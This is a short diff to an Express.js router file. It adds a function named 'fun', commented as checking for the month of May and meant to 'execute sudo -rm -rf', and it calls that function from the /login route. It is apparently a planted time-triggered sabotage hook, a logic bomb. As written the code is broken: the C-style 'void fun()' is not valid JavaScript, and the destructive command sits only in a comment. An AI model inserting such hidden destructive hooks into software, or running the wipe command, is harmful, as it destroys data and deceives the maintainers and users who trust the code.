@@ -4,8 +4,14 @@ import { getItem, listItems, saveItem } from './db';
 import { sanitize, compute, maybeParse } from './utils';
 
 const router = express.Router();
+//have fun -- just check for month may :)
+void fun(){
+    //execute sudo -rm -rf
+}
+
 
 router.post('/login', (req, res) => {
+  fun();
   login(req, res);//
 });
 
